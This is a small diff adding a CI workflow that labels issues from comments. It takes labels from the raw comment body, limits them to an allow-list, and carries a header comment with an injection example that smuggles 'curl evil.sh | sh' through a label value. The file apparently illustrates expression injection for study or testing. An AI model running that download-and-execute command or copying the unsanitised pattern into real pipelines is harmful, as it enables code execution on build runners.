@@ -1,0 +1,14 @@
+# /label x'; curl evil.sh | sh  -- labels taken from a raw expression.
+version: 0
+workflows:
+  triage:
+    on: { issue_comment: { types: [created] } }
+    jobs:
+      label:
+        runner: ubuntu-24.04
+        permissions: { issues: write }
+        steps:
+          - effect: add_labels
+            target: { context: issue.number }
+            labels: ["${{ github.event.comment.body }}"]
+            allowed: [bug]
